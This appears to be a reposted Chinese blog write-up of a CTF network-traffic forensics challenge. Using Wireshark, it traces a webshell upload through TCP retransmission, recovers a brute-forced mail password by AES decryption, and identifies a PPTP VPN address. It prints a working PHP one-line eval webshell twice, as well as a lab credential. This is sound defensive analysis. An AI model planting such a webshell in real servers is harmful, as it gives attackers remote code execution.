    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>闲来无事，做了做最近安恒<code>8</code>月比赛的流量包，发现有些题目给的分析不够详细。本着学习知识的心态，重新梳理下思路，稍加扩展，再引申谈谈个人对网络流量取证方面的一些见解。</p><a id="more"></a> <h4 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h4><p>详细的比赛题目和分析详见<a href="https://jianghuxia.github.io/2018/08/26/%E5%AE%89%E6%81%92%E5%85%AB%E6%9C%88%E6%9C%88%E8%B5%9B%E6%B5%81%E9%87%8F%E5%8C%85writeup/">这个网站</a>（此处建议详细看看，最好数据包自行下载分析一遍），下面介绍下题目背景，再挑出几道题目深度分析下。</p><h5 id="题目背景"><a href="#题目背景" class="headerlink" title="题目背景"></a>题目背景</h5><p>某公司内网网络被黑客渗透，黑客首先攻击了一台<code>web</code>服务器，破解了后台的账户的密码，随之利用破解的密码登录了<code>mail</code>系统，然后获取了<code>vpn</code>的申请方式，然后登录<code>vpn</code>，在内网<code>pwn</code>掉一台打印机。</p><h5 id="题目线索总分析"><a href="#题目线索总分析" class="headerlink" title="题目线索总分析"></a>题目线索总分析</h5><p>根据题目背景，我们把握下总体脉络，顺着黑客的思路走一番：</p><p>首先，黑客攻击公司的一台<code>web</code>服务器。走的是以<code>tcp</code>为载体的<code>http</code>请求，所以过滤<code>http</code>数据分组，成为解题最基本的分析思路。</p><p>接着，黑客破解了后台的账户的密码，随之利用破解的密码登录了<code>mail</code>系统。通过这点，我们追踪<code>http</code>，发现更多的线索，比如黑客破解的是哪个账号的哪个密码、登录了<code>mail</code>系统后获取的<code>vpn</code>是什么等等内容。</p><p>最后，黑客获取了<code>vpn</code>的申请方式，然后登录<code>vpn</code>，在内网<code>pwn</code>掉一台打印机。至此，黑客登录了<code>vpn</code>，那么是否通过分析此时的流量推出黑客登录时所用的<code>ip</code>，亦或者其他信息呢？</p><p>至此，基本脉络分析完毕。当然，以上脉络在没有具体分析数据包前，都只是靠推测去模拟出黑客的种种行为，具体如何分析才是最值得深究的一块。这时，可能又会有人问到，黑客就一定按照你想的去做吗？请注意，凡事没有证据（流量包）之前，我们都不能确定事情的真相如何，分析前的推测更多地是指引我们可以从什么角度去分析，而不是说黑客按照我们怎么想的去怎么做。推测不一定都成立，同样，成立的不一定是推测，推测更多的是给我们一个取证的方向。这也正是数据包取证分析的有趣之处，处处悬疑，步步惊心，但真相出来之际，又有恍然大悟之感的喜悦之情。</p><h4 id="迷之坑点"><a href="#迷之坑点" class="headerlink" title="迷之坑点"></a>迷之坑点</h4><h5 id="疯狂踩坑—tcp重传机制"><a href="#疯狂踩坑—tcp重传机制" class="headerlink" title="疯狂踩坑—tcp重传机制"></a>疯狂踩坑—tcp重传机制</h5><p><code>4、某公司内网网络被黑客渗透，请分析流量，得到黑客上传的webshell文件名是，内容是什么,提交webshell内容的base编码</code></p><p>这个问题，比赛时，死活找不到答案，但是在浏览<code>webone.pcap</code>数据包的末尾，发现<code>a.php</code>里面有<code>1234</code>为传递值，自己构造了个一句话木马：&lt;?php @eval($_POST[1234]);?&gt;，然后base64提交完成的。</p><p><img src="/2018/08/31/一次网络流量分析引起的分析/1535690664219.png" alt="1535690664219"></p><p>当然，得到了此题比赛的分数，但是，不是为了比赛而做题，而是通过以赛督学。比赛结束后，细细分析，上传<code>shell</code>需要提交<code>POST</code>的请求，于是<code>http</code>的<code>POST</code>请求包浏览一遍，发现目录为<code>/admin/article.php?rec=update</code>的请求页面非常可疑，但是，却始终没有找到含有一句话木马的上传页面？怎么办呢?苦苦思想，咦，有没可能<code>tcp</code>这个载体漏传了，造成了包丢失？随后，过滤语句<code>tcp contains &quot;&lt;?php @eval&quot;</code>一试，终于找到了正确答案，再试<code>http contains &quot;&lt;?php @eval&quot;</code>依旧没找到，十有八九是丢包了，但这到底是为什么，还需进一步分析。</p><p><img src="/2018/08/31/一次网络流量分析引起的分析/1535282630426.png" alt="1535282630426"></p><p>随后我追踪了下<code>tcp</code>流，找到了没在<code>http</code>流中一句话木马上传的页面。</p><p><img src="/2018/08/31/一次网络流量分析引起的分析/1535690893424.png" alt="1535690893424"></p><p>仔细分析了下这个<code>tcp</code>流的来往，我想我找到了真相。</p><p><img src="/2018/08/31/一次网络流量分析引起的分析/1535690519402.png" alt="1535690519402"></p><p>首先，看看上图的<code>733791</code>序号分组，我们可以看到<code>&quot;TCP Previous segment not captured&quot;</code>，提示“存在没有抓到的数据包”，也就是意味着：在当前包的捕获中，缺少了本应出现的某些包。紧接着<code>733793</code>序号分组，<code>&quot;Tcp Retransmission&quot;</code>,提示“<code>Tcp</code>包重传”。很明显，存在了丢包，引发了<code>TCP</code>的重传机制。</p><p><img src="/2018/08/31/一次网络流量分析引起的分析/1535693859074.png" alt="1535693859074"></p><p>随后我寻找了下tcp重传的相关文档<a href="https://tools.ietf.org/html/rfc2001" target="_blank" rel="noopener">rfc2001</a>，该文档是描述<code>TCP</code>慢启动，避免拥塞，快速重传和快速恢复算法相关机制的文档。其中快速重传有这么一句描述</p><p><img src="/2018/08/31/一次网络流量分析引起的分析/1535692779265.png" alt="1535692779265"></p><p>翻译下：<code>“当收到一个出问题的分组，Tcp立即产生一个应答。这个相同的ack不会延迟。这个相同应答的意图是让对端知道一个分组被收到的时候出现问题，并且告诉它希望得到的序列号。”</code></p><p>那么接下来的<code>733794</code>序号分组，<code>&quot;Tcp Dup ACK 733789#1&quot;</code>，这就代表着，继<code>733789</code>分组序列号后，提示重新传输因某些原因导致的丢包数据。于是，<code>733801</code>序号分组，开始重新传输这段数据。当然，我们可以通过每个分组后面的<code>Seq</code>值，验证是否是重传包。</p><p>比如：<code>733794</code>序号分组，此时的<code>Seq</code>值为<code>1</code>，Ack值为<code>3606</code>（与<code>733789</code>序列号相当）；<code>733801</code>序号分组，此时的<code>Seq</code>值为<code>3606</code>，<code>Ack</code>值为<code>1</code>，<code>len</code>值为<code>1460</code>；<code>733802</code>序号分组，此时的<code>Seq</code>值为<code>1</code>，<code>Ack</code>值为<code>5066</code>（<code>733805</code>序号分组<code>Seq</code>和<code>Ack</code>值刚好与此相反）；通过验算，<code>3606+1460=5066</code>，至此，完全符合重传后每个包的<code>Seq</code>、<code>Ack</code>对应值。这样，我们成功了解决的了这题的疑问，上传的是文本内容为&lt;?php @eval($_POST[1234]);?&gt;的<code>1.php</code>文件。</p><h5 id="疯狂踩坑—社工？还是溯源？"><a href="#疯狂踩坑—社工？还是溯源？" class="headerlink" title="疯狂踩坑—社工？还是溯源？"></a>疯狂踩坑—社工？还是溯源？</h5><p>10、黑客使用了什么账号登陆了<code>mail</code>系统（形式: <code>username/password</code>）</p><p>此题说来有趣，此题答案跟原关卡<code>3</code>答案相同，说解法是社工（我想跟大佬们学下怎么社工），但是对比了下，两个关卡中所用到的数据包给的源服务器<code>ip</code>并不一样。当然，管他白猫黑猫，抓到老鼠就是好猫，比赛时能做出来的确厉害。比赛完后的题目说了“利用破解的密码登录了<code>mail</code>系统”，好吧，这个我也勉强能够接受。以下的内容是根据请教<strong>三斤鱼</strong>大佬，赛后复现出来的，在此再次谢过。</p><p>这题需要看<code>mailtwo.pcap</code>和<code>mailtwo1.pcap</code>两个数据包。</p><p>首先在<code>mailtwo.pcap</code>中过滤<code>http</code>，分组序号<code>3</code>的<code>Cookie</code>中就发现 <code>login_name=wenwenni</code>字段，并且是<code>action=logout</code>。<img src="/2018/08/31/一次网络流量分析引起的分析/1535267557510.png" alt="1535267557510"></p><p>继续观察数据包，发现分组序号<code>28</code>的<code>Get</code>登录请求，再看看分组序号<code>35</code>的响应，猜测系统是通过验证cookies信息允许其免密登录，并在其中发现了输入密码后的加密函数：</p><p><img src="/2018/08/31/一次网络流量分析引起的分析/1535268095509.png" alt="1535268095509"></p><p>取出来发现是<code>AES</code>的<code>CBC</code>加密，填充格式为<code>ZeroPadding</code>，密钥为字符串<code>1234567812345678</code>的<code>hash</code>值，偏移量为<code>1234567812345678</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> key_hash = CryptoJS.MD5(<span class="string">'1234567812345678'</span>);</span><br><span class="line"><span class="keyword">var</span> key = CryptoJS.enc.Utf8.parse(key_hash);</span><br><span class="line"><span class="keyword">var</span> iv  = CryptoJS.enc.Utf8.parse(<span class="string">'1234567812345678'</span>);</span><br><span class="line"> form.password.value = CryptoJS.AES.encrypt(form.password.value, key, &#123; <span class="attr">iv</span>: iv,<span class="attr">mode</span>:CryptoJS.mode.CBC,<span class="attr">padding</span>:CryptoJS.pad.ZeroPadding&#125;);</span><br></pre></td></tr></table></figure><p>在下一分组序号<code>42</code>请求对应的分组序号<code>45</code>返回的响应报文中出现<code>{&quot;success&quot;:true}</code>，表示登陆成功。</p><p><img src="/2018/08/31/一次网络流量分析引起的分析/1535268433463.png" alt="1535268433463"></p><p>既然如此，我们使用<code>(http contains &quot;{\&quot;success\&quot;:true}&quot; or http.request.method==&quot;POST&quot;) and ip.addr==192.168.94.59</code>过滤一下，显示出<code>post</code>请求及成功的返回结果，浏览一下发现是在爆破，并且到<code>mailtwo.pcap</code>的最后也未爆破成功。相同的过滤条件上在<code>mailtwo1.pcap</code>上试试，发现几条数据，从后往前看，发现分组序号<code>18152</code>是登陆成功的返回结果，那对应的分组序号<code>17126</code>则就是正确的加密后的密码。这里可能会有疑问，黑客不是能成功登录<code>wenwenni</code>用户嘛，为啥还要爆破<code>admin</code>用户？(⊙o⊙)…，说个实在话，那个时候我也有这个疑问，不过后面想想，咱们自己渗透的时候不也是习惯先注册一个账号登录玩玩嘛？</p><p><img src="/2018/08/31/一次网络流量分析引起的分析/1535269130976.png" alt="1535269130976"></p><p>那么<a href="http://tool.chacuo.net/cryptaes" target="_blank" rel="noopener">解密网址</a>进行<code>aes</code>解密即可得到<code>admin</code>账号的密码。此题最终答案即为：<code>admin/admin!@#PASS123</code></p><p><img src="/2018/08/31/一次网络流量分析引起的分析/1535267206637.png" alt="1535267206637"></p><h5 id="疯狂踩坑—vpn流量分析学习"><a href="#疯狂踩坑—vpn流量分析学习" class="headerlink" title="疯狂踩坑—vpn流量分析学习"></a>疯狂踩坑—vpn流量分析学习</h5><p><code>11、某公司内网网络被黑客渗透，请分析流量，黑客获得的vpn,ip是多少</code></p><p>此题答案，额，也不知道算不算不难，额，比赛时，给的两个<code>vpn</code>的数据包，其中<code>ip</code>没几个，一个一个去试，也就出来答案了。下面讲讲自己的做法。</p><p>首先，放出个<a href="https://blog.csdn.net/zhaqiwen/article/details/10083025" target="_blank" rel="noopener">PPTP 理解以及报文的分析</a>学习下先，磨刀不误砍柴工嘛。看懂数据包是分析流量包的第一步。打开<code>vpn.one</code>数据包，之前对<code>vpn</code>的数据包没啥研究，不过借此机会好好学习一番。按照正常的分析流程，<code>wireshark</code>三板斧分析一番。</p><p><img src="/2018/08/31/一次网络流量分析引起的分析/1535701649090.png" alt="1535701649090"></p><p>可以发现<code>GRE</code>、<code>UDP</code>、<code>TCP</code>中三者中，<code>GRE</code>在整个传输层所占比例最大。<code>GRE</code>，<code>Generic Routing Encapsulation</code>，中文名为<strong>通用路由封装协议</strong>，是<code>VPN</code>（<code>Virtual Private Network</code>）的第三层隧道协议。再看图分析，<code>GRE</code>封装着<code>PPP</code>（<code>Point-to-Point Protocol</code>点到点协议），相应的学习链接放置文章末尾（两个协议所在哪一层要先了解）。</p><p><img src="/2018/08/31/一次网络流量分析引起的分析/1535702884388.png" alt="1535702884388"></p><p>其次我们再看看对话，可以清晰的发现，<code>192.168.32.131</code>是基本上每个对话都用到了，可以锁定这条<code>ip</code>地址。并且，我们还发现对话中，<code>192.168.32.255</code>和<code>192.168.94.59</code>两个ip与<code>192.168.32.131</code>对话都很多，那么就很明显，忽略网关后，那就只剩<code>192.168.94.59</code>这个ip了。</p><p>在此分析过程中，我们会遇到其他的“干扰选项”，这些都需要自行筛选分析，比如上图的<code>209.244.0.3</code>与<code>192.168.32.131</code>的对话就如下，一看就知道是无关信息咯。</p><p><img src="/2018/08/31/一次网络流量分析引起的分析/1535703395820.png" alt="1535703395820"></p><p>知道可疑ip后，过滤下，过滤语句<code>ip.addr == 192.168.94.59</code></p><p><img src="/2018/08/31/一次网络流量分析引起的分析/1535703698549.png" alt="1535703698549"></p><p>过滤后，映入眼帘的pptp首个分组序号<code>4527</code>：<code>start-control-connection-reply</code> ，这个消息是由PPTP服务器发出，回应<code>start-controlconnection-request</code>消息。那就有点奇怪了，这条消息是回应的，那请求的去哪了？不知道你是否发现分组序号<code>4527</code>前几个分组的消息，没错，正如你所想的，又发生了丢包情况。那我们往下滑，看看完整的分组。</p><p><img src="/2018/08/31/一次网络流量分析引起的分析/1535704979291.png" alt="1535704979291"></p><p>很清晰，<code>192.168.94.59</code>和<code>192.168.32.131</code>通过三次握手时，出现了分组序号<code>4581</code>：<code>start-control-connection-request</code> ，这是由PPTP客户端发出，请求建立控制连接。PPTP隧道要求在发送任何其他PPTP消息之前，先建立一条控制连接。那么很好，可以确定，黑客此时的<code>ip</code>是<code>192.168.94.59</code>。</p><p>再回看题目，黑客获得的<code>vpn</code>,<code>ip</code>是多少？难道是这个？不，天真了。问的应该是分配<code>vpn</code>的<code>ip</code>。接着往下分析，发现了黑客登录vpn时失败的消息：<code>Authentication failed</code>。</p><p><img src="/2018/08/31/一次网络流量分析引起的分析/1535705605064.png" alt="1535705605064"></p><p>再往下翻翻，不久，你就会发现</p><p><img src="/2018/08/31/一次网络流量分析引起的分析/1535705793769.png" alt="1535705793769"></p><p>黑客登录成功了，登录的用户名为<code>xiangh</code>，额，做到这里，其实我想知道<code>vpn</code>的密码，后面发现还是天真了，大佬们具体可以参照下<a href="https://blog.csdn.net/cuipengchong/article/details/17248385" target="_blank" rel="noopener">CHAP验证中的密码问题</a>。再接着，通过网站寻找资料学习了一波，发现文档<a href="https://tools.ietf.org/html/rfc1332" target="_blank" rel="noopener">rfc1332</a>有以下描述：</p><p><img src="/2018/08/31/一次网络流量分析引起的分析/1535706575546.png" alt="1535706575546"></p><p>又发现<a href="https://blog.csdn.net/windeal3203/article/details/51066331" target="_blank" rel="noopener">PPP协议</a>其中有这么一段描述</p><p><img src="/2018/08/31/一次网络流量分析引起的分析/1535707113943.png" alt="1535707113943">随后，翻翻数据包，找到了最终的答案，分组序号<code>4953</code>中<code>192.168.94.59</code>向<code>192.168.32.131</code>发送了一个请求，内容如下，可以发现全部为<code>0.0.0.0</code></p><p><img src="/2018/08/31/一次网络流量分析引起的分析/1535707460046.png" alt="1535707460046"></p><p>紧接着分组序号<code>4954</code>返回了一个期望的值（即规定给的<code>vpn</code>的<code>ip</code>）</p><p><img src="/2018/08/31/一次网络流量分析引起的分析/1535707586841.png" alt="1535707586841"></p><p>再接下来的两个连续分组序号<code>4955</code>表示<code>192.168.94.59</code>再次询问能否以<code>192.168.94.59</code>刚刚发送的期望值，作为<code>192.168.94.59</code>的详细内容，分组序号<code>4956</code>表示接受这个请求。</p><p>此题到此分析完毕，最终答案就是<code>10.3.4.3</code>咯。</p><h4 id="一些看法"><a href="#一些看法" class="headerlink" title="一些看法"></a>一些看法</h4><p>之所以想谈谈这些看法，一是经常有人问流量分析有那么重要吗？每次分析出事情的真相又如何，都已经发生了，改变不了结果的；二是针对最近的某酒店用户信息重大泄露事件；</p><p>这个时代科技的风云聚变，我想每个人都有各自的感受，对于我而言，大一听到的网络安全，大二听到的人工智能，直到现在，以太坊、区块链等等。这些东西，之前不是没有，而是突然间变“火”了。对于网络安全而言，它的特点是革新的速度，这不单单是网络技术迅猛发展的护航需要，更是”道高一尺魔高一丈“的比拼。相对而言，网络流量的取证分析，好像都是”黑与白“之间较量后，才显露出的结果（这个结果往往是不好的）。其实不然，取证的目的就在于揭示那些”黑与白“较量之间的、有意义的、先前不为人知的、被人忽视的细节。网络取证看似亡羊补牢，但这又何尝不是还原每个事件真相的必要呢？只有知道那些真相的细节之处，才会促进网络安全的发展，提升网络安全的防护意识。</p><p>取证是一门艺术，“真的假不了，假的也真不了”。对于这些大大小小的安全事件而言，取证分析后，分析出造成不良结果的种种原因，或许让人觉得搞笑，亦或者震惊。但仔细想想，何尝不是给每个人敲响了警钟，让每个人多了点意识，每个团队学习了新的技术，每个“白帽子”心中的那份正义呢？</p><p>网络取证，流量分析，可能不是一项关于安全的技术，而是一项关于“不安全”的技术？你，觉得呢？</p><p>文章相关资料学习链接：</p><p><a href="https://www.cnblogs.com/virusolf/p/4335613.html" target="_blank" rel="noopener">对TCP重传的进一步认识</a>、 <a href="https://blog.csdn.net/mary19920410/article/details/72303641" target="_blank" rel="noopener">浅析GRE协议（通用路由封装协议）</a>、<a href="https://blog.csdn.net/eydwyz/article/details/54879808" target="_blank" rel="noopener">GRE、PPTP、L2TP隧道协议</a></p><p>本文由安全客原创发布<br>以上转载来自<code>安全客</code>：<a href="https://www.anquanke.com/post/id/158660" target="_blank" rel="noopener">一次网络流量分析引发的思考</a><br>安全客 - 有思想的安全新媒体</p>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h4&gt;&lt;p&gt;闲来无事，做了做最近安恒&lt;code&gt;8&lt;/code&gt;月比赛的流量包，发现有些题目给的分析不够详细。本着学习知识的心态，重新梳理下思路，稍加扩展，再引申谈谈个人对网络流量取证方面的一些见解。&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://jianghuxia.github.io/tags/ctf/"/>
    
  </entry>
  
</feed>
